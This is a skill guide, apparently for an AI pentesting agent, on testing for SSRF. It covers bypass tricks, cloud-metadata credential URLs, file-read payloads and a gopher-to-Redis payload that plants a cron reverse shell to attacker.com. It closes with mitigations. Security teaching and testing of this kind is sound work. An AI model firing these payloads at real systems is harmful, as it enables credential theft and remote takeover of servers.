---
name: ssrf-testing
description: Specialized skills and methodology for SSRF (Server-Side Request Forgery) testing
version: 1.0.0
---

# SSRF (Server-Side Request Forgery) Testing

## Overview

SSRF (Server-Side Request Forgery) is a vulnerability that abuses server-initiated requests to access internal network resources, perform port scans, or bypass firewalls. This skill provides methods for detecting, exploiting, and mitigating SSRF vulnerabilities.

## Vulnerability Mechanics

The application accepts a URL parameter and fetches that URL. Because the attacker can control the request target, this can lead to:
- Internal network resource access
- Local file reads
- Port scanning
- Firewall bypass
- Cloud service metadata access

## Testing Methodology

### 1. Identifying SSRF Input Points

**Common functionality:**
- URL preview / screenshot generation
- File upload (remote URL)
- Webhook callbacks
- API proxies
- Data import
- Image processing
- PDF generation

### 2. Basic Detection

**Testing the local loopback:**
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

**Testing internal IPs:**
```
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

**Testing the file protocol:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### 3. Bypass Techniques

**IP address encoding:**
```
127.0.0.1 → 2130706433 (decimal)
127.0.0.1 → 0x7f000001 (hexadecimal)
127.0.0.1 → 0177.0.0.1 (octal)
```

**DNS resolution bypass:**
```
127.0.0.1.xip.io
127.0.0.1.nip.io
localtest.me
```

**URL redirection:**
```
http://attacker.com/redirect → http://127.0.0.1
```

**Protocol confusion:**
```
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
```

## Exploitation Techniques

### Internal Network Probing

**Port scanning:**
```bash
# Using Burp Intruder
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
```

**Identifying services:**
- Response time differences
- Error messages
- HTTP status codes
- Response content

### Cloud Service Metadata

**AWS EC2:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Google Cloud:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

**Alibaba Cloud:**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Attacking Internal Applications

**Accessing admin panels:**
```
http://127.0.0.1:8080/admin
http://192.168.1.100/phpmyadmin
```

**Unauthenticated Redis access:**
```
http://127.0.0.1:6379
# Then send Redis commands
```

**FastCGI attack:**
```
http://127.0.0.1:9000
# Exploit the FastCGI protocol to execute commands
```

## Advanced Exploitation

### Gopher Protocol

**Sending arbitrary protocol data:**
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a
```

**Redis command execution:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

### Dict Protocol

**Port scanning and information gathering:**
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:3306/status
```

### File Protocol

**Reading local files:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/environ
```

## Tool Usage

### SSRFmap

```bash
# Basic scan
python3 ssrfmap.py -r request.txt -p url

# Port scan
python3 ssrfmap.py -r request.txt -p url -m portscan

# Cloud metadata
python3 ssrfmap.py -r request.txt -p url -m cloud
```

### Gopherus

```bash
# Generate a Gopher payload
python gopherus.py --exploit redis
```

### Burp Collaborator

**Detecting blind SSRF:**
```
http://burpcollaborator.net
# Watch for DNS/HTTP callbacks
```

## Verification and Reporting

### Verification Steps

1. Confirm that the request target can be controlled
2. Verify internal network access or port scanning
3. Assess the impact scope (internal network pivoting, data exfiltration, etc.)
4. Document a complete PoC
5. Record confirmed vulnerabilities in the platform via the `report_finding` tool (the sole entry point for recording vulnerabilities on this platform); its fields cover location, type, severity, reproduction steps/PoC, and remediation recommendations

### Key Reporting Points

- Vulnerability location and input parameter
- Internal resources or ports that can be accessed
- Complete exploitation steps and PoC
- Remediation recommendations (URL allowlists, disabling dangerous protocols, etc.)

## Mitigations

### Recommended Approaches

1. **URL allowlist**
   ```python
   ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']
   parsed = urlparse(url)
   if parsed.netloc not in ALLOWED_DOMAINS:
       raise ValueError("Domain not allowed")
   ```

2. **Disable dangerous protocols**
   - Only allow http/https
   - Forbid file://, gopher://, dict://, etc.

3. **IP address filtering**
   ```python
   import ipaddress
   
   def is_internal_ip(ip):
       return ipaddress.ip_address(ip).is_private or \
              ipaddress.ip_address(ip).is_loopback
   ```

4. **Use DNS resolution validation**
   - Resolve the domain to obtain its IP
   - Verify the IP is not within the internal network range

5. **Network isolation**
   - Restrict the server's outbound network access
   - Use a proxy server

## Precautions

- Only test in authorized environments
- Avoid impacting internal network systems
- Be aware of which protocols are supported
- Watch request frequency during testing to avoid triggering defenses
